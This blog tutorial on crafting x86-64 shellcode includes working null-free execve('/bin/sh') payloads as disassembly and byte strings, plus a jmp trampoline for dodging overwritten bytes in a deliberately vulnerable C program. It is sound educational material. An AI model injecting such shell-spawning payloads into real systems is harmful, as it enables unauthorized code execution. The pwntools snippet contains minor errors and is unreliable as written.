---
title: "Shellcoding Like Da Vinci: From Bytes to Bash"
date: 2025-11-02 15:10:00 +0000
categories: [Writeups, Binex]
tags: [binex, shellcode, syscalls]
description: "Learning to craft effective shellcode with creativity."
---
## Introduction
Spawning a shell from user input is a strange thrill for beginner exploit developers. When I first spawned a shell with basic shellcode, I didn’t fully understand what had happened. I realized that to understand how simple exploits worked, I needed to dive into how programs function at their lowest level, leading to many long, frustrating nights as I tried to make sense of it. (This is still sometimes the case!)

Writing shellcode feels less like sudden inspiration and more like careful problem-solving. You are constantly working inside tight constraints: limited bytes, no libraries, direct syscalls, forcing us to be creative in our design choices: which registers to use, how to build arguments on the stack, and how to keep the payload small and reliable.

While learning to craft shellcode, I sometimes compare the process to an artist's work, not because I'm creating a masterpiece, but because both require iteration, restraint, and a willingness to try a creative approach until something functional emerges. Jokingly, my shellcode experience feels more like Dürer’s Head of a Bearded Child than da Vinci’s Mona Lisa. In this post, I’ll walk through a few examples so that maybe your shellcoding experience is a little less Bearded Child and more Mona Lisa... I hope!

[Dürer’s Head of a Bearded Child](https://www.google.com/url?sa=i&url=https%3A%2F%2Farthive.com%2Falbrechtdurer%2Fworks%2F3581~Head_of_a_bearded_baby&psig=AOvVaw0rRWW8YmVVuTBIeOEyOyT7&ust=1762314169005000&source=images&cd=vfe&opi=89978449&ved=0CBYQjRxqFwoTCLC62oTK15ADFQAAAAAdAAAAABAE)
<br>
[Da Vinci's Mona Lisa](https://www.google.com/imgres?q=da%20vinci%20mona%20lisa&imgurl=https%3A%2F%2Fupload.wikimedia.org%2Fwikipedia%2Fcommons%2Fthumb%2Fe%2Fec%2FMona_Lisa%252C_by_Leonardo_da_Vinci%252C_from_C2RMF_retouched.jpg%2F960px-Mona_Lisa%252C_by_Leonardo_da_Vinci%252C_from_C2RMF_retouched.jpg&imgrefurl=https%3A%2F%2Fen.wikipedia.org%2Fwiki%2FMona_Lisa&docid=8jbQaPwdqfR2tM&tbnid=fkcKujE8Il9mnM&vet=12ahUKEwjdu5ClyteQAxVZQjABHW9aGOAQM3oECBcQAA..i&w=960&h=1431&hcb=2&ved=2ahUKEwjdu5ClyteQAxVZQjABHW9aGOAQM3oECBcQAA)

## Usage
Shellcode is typically injected into a buffer that the program allocates for user input. Because buffer space is limited, your payload should be as small and simple as possible. In many realistic scenarios, you must fit both the shellcode and the overwrite (for example, a return pointer or function pointer) into the same constrained area.

Points to keep in mind:
- Keep the entry stub tiny; it should do only what’s necessary to bootstrap the payload.

- Favor position-independent techniques (RIP-relative addressing, push rsp; pop rdi, call/pop) so the code works regardless of exact addresses.

- Reserve space for alignment and any null-termination behavior the host copy routines might add.

- Assume the host could modify or stomp fixed offsets; plan trampolines, jump-over regions, or self-repair stubs accordingly.

## Painting over the white space (Null-Bytes)
Writing Shellcode is not always as simple as programming a raw assembly program that executes the execve system call. In fact, many times we will be faced with limitations such as null-bytes that can inhibit the effectiveness of our shellcode. Remember, since we are going to be inputting our Shellcode in programs that do some sort of string manipulation, we have to account for how many C programming language functions handle null-bytes. Most standard C library functions that operate on strings use the null byte (0x00) as a terminator and stop processing data once they find a null byte. This can be an issue for our shellcode, since these functions are often how we get our shellcode into a running process.

One technique for setting up shellcode is to place the value /bin/sh\0 or 0x0068732f6e69622f into RDI, setting up the execve syscall. However, if we MOV this value into our RDI register, we will get a null byte. As previously mentioned, this null byte becomes problematic. One way to bypass this null byte is to put a random byte, in our example, I chose '6a', replacing the null character. Next, before pushing this value to the stack, we can perform a right shift (shr) on RDI by 0x8 to get a null-free /bin/sh\0.

> Keep in mind endianess
{: .prompt-tip }

### Null-Free Shell code.
```
Disassembly:
0:  48 bf 6a 2f 62 69 6e    movabs rdi,0x68732f6e69622f6a  ;/bin/sh\0
7:  2f 73 68
a:  48 c1 ef 08             shr    rdi,0x8                 ; Rotating off the unneeded byte
e:  57                      push   rdi                     ; Pushing the value to the stack.
f:  48 89 e7                mov    rdi,rsp
12: 48 31 f6                xor    rsi,rsi
15: 48 31 d2                xor    rdx,rdx
18: 6a 3b                   push   0x3b                     ; Syscall number for execve is 3b
1a: 58                      pop    rax                      ; Pop the syscall value into rax, completing the syscall setup.
1b: 0f 05                   syscall                         ; Call execve
```

## Additional methods to avoid null bytes.
<br>
### XOR'ing Registers
```
Disassembly:
0:  48 c7 c0 00 00 00 00    mov    rax,0x0
7:  48 31 c0                xor    rax,rax
```
### Using Proper Register Sizes
```
Disassembly:
0:  48 c7 c2 05 00 00 00    mov    rdx,0x5
7:  b2 05                   mov    dl,0x5
```

## Kinetic Art (Avoiding the Stomp)
Sometimes we may run into the issue where our shellcode is modified after we supply the code to the user input. One way to prevent this modification is through the use of the jump instruction. This is known as trampolining. [Corelan Exploit Blog](https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/) <br>
Let's analyze a snippet of C code:
```
    char buffer[32] = {};
    char shellcode[32] = {};   
    
    printf("Enter a string: ");
    fgets(buffer, sizeof(buffer), stdin);

    // Constrain shellcode to be NULL-free
    strncpy(shellcode, buffer, sizeof(shellcode));
    memset(buffer, 0, sizeof(buffer));  
    
    // Stomp over some shellcode (added constraints)
    shellcode[16] = '\xff';
    shellcode[17] = '\xe3';
    shellcode[18] = '\xff';
    shellcode[19] = '\xe7';

    ((void (*)(void))shellcode)();
```
In this C program, we see that our shellcode buffer is stomped after we fill it with our user input. This alteration will cause our Shellcode to fail, preventing us from gaining a shell. To avoid this, we must analyze the Shellcode provided to determine how to utilize the jmp instruction to avoid the stomp. 

<br>
Original Shellcode Before Stomping
```
Disassembly:
31 f6                   xor    esi,esi
48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
2f 73 68
56                      push   rsi
53                      push   rbx
54                      push   rsp
6a 3b                   push   0x3b
58                      pop    rax
31 d2                   xor    edx,edx
0f 05                   syscall
```
When we interact with the program in our debugger, we see that the Shellcode is stomped starting at address 0x7fffffffeda0, see below. Since we know that the program alters bytes 16-19 of our buffer, we can take advantage of the jmp instruction to bypass this restraint. When using the jmp instruction, it is important to remember that it increments $rip by a given amount, starting at its own address. So, say we have the following code snippet:

```
Disassembly:
0:  eb 01                   jmp    3 <_main+0x3>
2:  90                      nop
3:  0f 05                   syscall
```

Our jmp $+3 command jumps the next 3 bytes, including the current instruction, and in this case, skips over the nop instruction. This becomes important when calculating how many bytes we want to jump.

Back to our example with the shellcode buffer, since we know that bytes 16-19 of our shellcode buffer are stomped, we can place a jmp $+6, avoiding the alteration done to our input, which breaks the shellcode. 

#### Original Shellcode, Stomped by the Program.
```
Provided Shellcode:
"\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05"

Stomped Version:
0x7fffffffed90: 0x31    0xf6    0x48    0xbb    0x2f    0x62    0x69    0x6e
0x7fffffffed98: 0x2f    0x2f    0x73    0x68    0x56    0x53    0x54    0x5f
0x7fffffffeda0: 0xff    0xe3    0xff    0xe7    0xd2    0x0f    0x05    0x0a
0x7fffffffeda8: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
0x7fffffffedb0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

#### Placing the jmp
```
Disassembly:
0:  31 f6                   xor    esi,esi
2:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f
9:  2f 73 68
c:  56                      push   rsi
d:  53                      push   rbx
e:  eb 04                   jmp    14 <_main+0x14>
10: 54                      push   rsp
11: 6a 3b                   push   0x3b
13: 58                      pop    rax
14: 31 d2                   xor    edx,edx
16: 0f 05                   syscall
```

#### Utilizing the jmp instruction, Stomp Avoided.
```
Python Escaped:
"\x31\xF6\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x56\x53\xEB\x04\x90\x90\x90\x90\x54\x5F\x6A\x3B\x58\x31\xD2\x0F\x05"

0x7fffffffed90: 0x31    0xf6    0x48    0xbb    0x2f    0x62    0x69    0x6e
0x7fffffffed98: 0x2f    0x2f    0x73    0x68    0x56    0x53    0xeb    0x04
0x7fffffffeda0: 0xff    0xe3    0xff    0xe7    0x54    0x5f    0x6a    0x3b
0x7fffffffeda8: 0x58    0x31    0xd2    0x0f    0x05    0x0a    0x00    0x00
0x7fffffffedb0: 0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
```

## Conclusion
Shellcoding is a craft learned by repetition. Early on, you’ll run into small, stubborn nuances that keep a payload from running. This is part of the process! For me, the point isn’t just “getting a shell”; it’s learning how programs really work at a low level. Anyone can stuff a buffer with A’s and pass a simple crackme, but few take the time to understand register choice, calling conventions, and the subtle tricks that make compact payloads robust. This will pay dividends in your binary exploitation journey!

I challenge you to get your hands dirty: write intentionally vulnerable C programs, test your shellcode against them, and use free training resources like pwn.college and ost2 training to advance your skill-set. When your first attempts look more like Dürer’s Head of a Bearded Child than a Mona Lisa, don’t quit. Keep modifying your code, making choices until you turn bytes into something that works.



## Helpful Resources

| ARCH | NR | RETURN | ARG0 | ARG1 | ARG2	| ARG3 | ARG4	| ARG5 |
|---|---|---|---|---|---|---|---|---|
x86 | eax | eax | ebx | ecx | edx | esi | edi | ebp |
x64	| rax	| rax	| rdi	| rsi	| rdx |	r10 |	r8	| r9 |

> [Helpful Syscall Calling Conventions Resource](https://syscall.sh/)<br>
> [Helpful x86 Syscall Resource](https://x86.syscall.sh/)<br>
> [Helpful x64 Syscall Resource](https://x64.syscall.sh/)<br>
{: .prompt-tip }

#### Using pwntools
```
#! /usr/bin/env python3

from pwn import *
context.arch = 'amd64'
my_sc_bytes = asm(```
    mov rax, 60
    mov rax, 1337
    syscall
```)
#disasm will show opcodes.
print(disasm(my_sc_bytes))

```
#### More Manual Approach to Create Shellcode
> Assemble the object code ```gcc -nostdlib -static -o shellcode-elf shellcode.s ```
> <br>
> Pull out only the shellcode ```objcopy --dump-section .text=shellcode shellcode-elf ```
> <br>
> To view the shellcode, use hexdump.
{: .prompt-tip }

#### Boiler Plate Template
```
.intel_syntax noprefix
.globl _start
_start:
  mov rax, 60
  mov rdi, 1337
  syscall
```

#### Links
[Corelan Exploit Writing Blog Series](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
[Shellcode/NullFree](https://nets.ec/Shellcode/Null-free) 
<br>
[pwn.college Shellcode Module](https://pwn.college/dojo/program-security)
<br>
[Helpful Syscall Calling Conventions Resource](https://syscall.sh/)
<br>
[Helpful x86 Syscall Resource](https://x86.syscall.sh/)
<br>
[Helpful x64 Syscall Resource](https://x64.syscall.sh/)
<br>
